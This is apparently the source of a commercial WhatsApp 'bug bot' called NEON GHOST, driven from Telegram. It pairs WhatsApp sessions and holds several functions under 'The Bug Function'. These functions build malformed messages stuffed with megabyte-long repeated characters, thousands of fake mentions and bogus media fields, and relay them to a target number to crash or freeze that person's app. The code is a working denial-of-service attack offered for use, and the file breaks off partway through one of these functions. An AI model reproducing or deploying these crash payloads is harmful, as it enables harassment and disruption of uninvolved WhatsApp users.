const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
global.isWhatsAppConnected = false;
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const Module = require("module");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const userState = {};
const axios = require("axios");
const FormData = require("form-data");
const https = require("https");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));

const bot = new TelegramBot(BOT_TOKEN, { polling: true })

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/muhammadradityaarkan593-pixel/Kanzzz69955/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
  const validTokens = await fetchValidTokens();
  if (validTokens && validTokens.includes(BOT_TOKEN)) {    
    
    // ... kode bot lainnya ...
    startBot();
  } else {
    console.log(chalk.red("WELCOME TO SC NEON GHOST"));
    console.log(chalk.bold.red(`
    ═══════════════════════════════════════════
⛔ TOKEN ANDA TIDAK TERDAFTAR DI DATABASE !!! ⛔
═══════════════════════════════════════════
⠀⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ `));
    process.exit(1);
  }
}

  console.log(chalk.green(`TOKEN LU VALID, MENUNGGU SCRIPT UNTUK MERESPON...`));
  startBot();

function startBot() {
  console.log(
    chalk.bold.green(`

 ╔════════════════════╗
║   BOT TELAH AKTIF ✅        ║
║TERIMAKASIH TELAH MEMBELI ║    
 ╚════════════════════╝

    `));
}

validateToken();

// log pesan masuk
bot.on("message", (msg) => {
  console.log(`[LOG] ${msg.from.username || msg.from.first_name}: ${msg.text}`);
});

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.red(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.yellow(`Mencoba menghubungkan WhatsApp: ${botNumber}`));

        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
              console.log(chalk.blue(`Bot ${botNumber} terhubung!`));
              sessions.set(botNumber, sock);
              resolve();
            }

            else if (connection === "close") {
              const status = lastDisconnect?.error?.output?.statusCode;
              const shouldReconnect = status !== DisconnectReason.loggedOut;

              if (shouldReconnect) {
                console.log(chalk.yellow(`Menghubungkan ulang bot ${botNumber}...`));
                setTimeout(() => initializeWhatsAppConnections(), 1500);
              } else {
                console.log(chalk.red(`Bot ${botNumber} logout. Hapus session dulu.`));
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
NEON-GHOST-PAIR
BOT: ${botNumber}
STATUS: Inisiliasi...
\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
    global.isWhatsAppConnected = false;
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
   `\`\`\`
NEON-GHOST-PAIR
BOT: ${botNumber}
STATUS: Mencoba menghubungkan...
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`
NEON-GHOST-PAIR
BOT: ${botNumber}
STATUS: Tidak dapat terhubung
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
    global.isWhatsAppConnected = true;
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText( 
`\`\`\`
NEON-GHOST-PAIR
BOT: ${botNumber} 
STATUS: Berhasil terhubung!
\`\`\``,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "NEONNEON");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`
NEON-GHOST-PAIR
BOT : ${botNumber}
CODE : ${formattedCode}
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`GAGAL MEMINTA CODE PAIRING : ${botNumber}\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}





//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days}d, ${hours}h, ${minutes}m, ${secs}s`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomPhoto() {
  const photos = [
    "https://files.catbox.moe/9ebilq.jpg",
  ];
  return photos[Math.floor(Math.random() * photos.length)];
}
// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `✅ Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "❌ - Tidak Ada Waktu Aktif";
  }
}

// ---------( The Bug Function)---------

async function ghotsinvisible(sock, target) {
  const ptcp = true; 
  const msg = {
    ephermalMessage: {
      body: { 
        text: "", 
        format: "DEFAULT" 
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: "\x10".repeat(700000),
        version: 3,
      },
      entryPointConversionSource: "{}",
      contextInfo: {
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: "FPM",
            expiryTimestamp: 1814400000
          }
        },
        mentionedJid: ptcp ? Array.from({ length: 100 }, () => "0@newsletter") : [],
        groupMentions: [
          {
            groupJid: "0@newsletter",
            groupSubject: "Aether Freeze"
          }
        ],
        participant: target,
        remoteJid: target
      },
    }
  };

  for (const message of [msg]) {
    await sock.relayMessage("status@broadcast", message.ephermalMessage, {
      messageId: Math.random().toString(36).substring(7),
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    
    console.log(`INVISIBLE SENDING TO ${target}`);
  }
}

async function delayAnukm(sock, target) {
  const Msg1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "NG IS HERE",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "ðŸ”¨ðŸ•Š"
        },
        contextInfo: {
          stanzaId: target,
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    }
  };

  const Msg2 = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "9e8",
          pageCount: 1316134911,
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileName: "Tes!!" + "ê¦¸".repeat(80000),
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743848703",
          jpegThumbnail: null,
          thumbnailWidth: 999999,
          thumbnailHeight: 9998888, // Diperbaiki: "thumbnailHeigth" -> "thumbnailHeight"
          streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
          thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
          artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
          artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
          artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
          caption: "ê¦¸".repeat(200000)
        }
      }
    }
  };
  const Msg3 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
          title: "NEON GHOST ANTI AMPASS",
            text: "NEON GHOST IS HERE!",
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

const Msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
  
  for (const msg of [Msg1, Msg2, Msg3, Msg4]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(`YxG - Fortun Sending Bug To ${target} suksesfull`);
  }
}

async function slomobanget(sock, target) {
    const zunn = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "SEJAYA - Delay Ga bg",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "🔨🕊"
                },
                contextInfo: {
                    mentionedJid: [...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 5000000) + "91@s.whatsapp.net")],
                    isForwarded: true,
                    forwardingScore: 999,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "1@newsletter",
                        serverMessageId: 1,
                        newsletterName: "Hooh"
                    }
                },
            },
        },
    };

    await sock.relayMessage(target, zunn, {
        participant: { jid: target }
    });

    console.log(`DELAY BASIC SENDING TO ${target}`); 
}

async function FriendCrashSimple(sock, target) {
  if (!sock || !target) return;
  try {
    const m = await generateWAMessageFromContent(target, { 
      locationMessage: { 
        degreesLatitude: 1e15, 
        degreesLongitude: 1e15, 
        name: 'ြ'.repeat(30000), 
        address: 'ြ'.repeat(30000), 
        isLive: true, 
        accuracyInMeters: 1e15, 
        jpegThumbnail: Buffer.alloc(0) 
      } 
    }, { 
      userJid: sock.user.id,
      upload: sock.waUploadToServer 
    });
    await sock.relayMessage(target, m.message, { 
      participant: { jid: target }, 
      messageId: m.key.id 
    });
  } catch (error) {
    console.error("Error:", error.message);
  }
}

async function BlankDelay(sock, target) {
  let button = []; 
  
  for (let i = 0; i < 5; i++) {
    button.push(
      {
        buttonId: "OndetPcx",
        buttonText: {
          displayText: "ꦾ".repeat(5000)
        },
        type: 1
      },
      {
        buttonId: "PepekJuleAnget",
        buttonText: {
          displayText: "ꦾ".repeat(5000)
        },
        type: 1
      },
      {
        buttonId: "Yareu",
        buttonText: {
          displayText: "ꦾ".repeat(5000)
        },
        type: 1
      }
    );
  }
  
  const msg = {
    buttonsMessage: {
      contentText: "꧀".repeat(10000),
      footerText: "ꦾ".repeat(20000),
      headerType: 1,
      text: "ꦾ".repeat(5000), 
      buttons: button
    },
    contextInfo: {
      mentionedJid: [
        "13135550202@s.whatsapp.net", 
        ...Array.from(
          { length: 2000 },
          () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        )
      ],
      stanzaId: "X",
      participant: target,
      remoteJid: target,
      quotedMessage: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
          fileName: "Ondet Redy Vcs",
          fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
          directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1724474503",
          contactVcard: true,
          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
          jpegThumbnail: ""
        },
        contextInfo: {
          mentionedJid: [
            "13135550202@s.whatsapp.net", 
            ...Array.from(
              { length: 2000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
}

async function CrashHorseXUiForce(target) {
const message = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝐍𝐄𝐎𝐍 𝐆𝐇𝐎𝐒𝐓 ϟ 𝐈𝐒 𝐇𝐄𝐑𝐄 🩸" + "\u200D".repeat(2000)
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  ...(await prepareWAMessageMedia({
                    image: { url: "https://img1.pixhost.to/images/6002/603813009_rizzhosting.jpg" }
                  }, {
                    upload: sock.waUploadToServer
                  })),
                  title: "𝐍𝐄𝐎𝐍 𝐆𝐇𝐎𝐒𝐓 ϟ 𝐈𝐒 𝐇𝐄𝐑𝐄 🩸",
                  gifPlayback: true,
                  subtitle: "𝐍𝐄𝐎𝐍 𝐆𝐇𝐎𝐒𝐓 ϟ 𝐈𝐒 𝐇𝐄𝐑𝐄 🩸",
                  hasMediaAttachment: true
                },
                body: {
                  text: "𝐍𝐄𝐎𝐍 𝐆𝐇𝐎𝐒𝐓 ϟ 𝐈𝐒 𝐇𝐄𝐑𝐄 🩸" + "ꦾ".repeat(120000)
                },
                footer: {
                  text: "𝐍𝐄𝐎𝐍 𝐆𝐇𝐎𝐒𝐓 ϟ 𝐈𝐒 𝐇𝐄𝐑𝐄 🩸"
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "",
                        sections: []
                      })
                    },
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "𑲭𑲭".repeat(60000),
                        sections: [
                          {
                            title: " i wanna be kill you ",
                            rows: []
                          }
                        ]
                      })
                    },
                    { name: "call_permission_request", buttonParamsJson: "{}" },
                    { name: "mpm", buttonParamsJson: "{}" },
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "𝐍𝐄𝐎𝐍 𝐆𝐇𝐎𝐒𝐓 ϟ 𝐈𝐒 𝐇𝐄𝐑𝐄 🩸",
                        sections: [
                          {
                            title: "𝐍𝐄𝐎𝐍 𝐆𝐇𝐎𝐒𝐓 ϟ 𝐈𝐒 𝐇𝐄𝐑𝐄 🩸",
                            highlight_label: "💥",
                            rows: [
                              { header: "", title: "💧", id: "⚡" },
                              { header: "", title: "💣", id: "✨" }
                            ]
                          }
                        ]
                      })
                    },
                    {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Quick Crash Reply",
                        id: "📌"
                      })
                    },
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Developed",
                        url: "https://t.me/Whhwhahwha",
                        merchant_url: "https://t.mw/Whhwhahwha"
                      })
                    },
                    {
                      name: "cta_call",
                      buttonParamsJson: JSON.stringify({
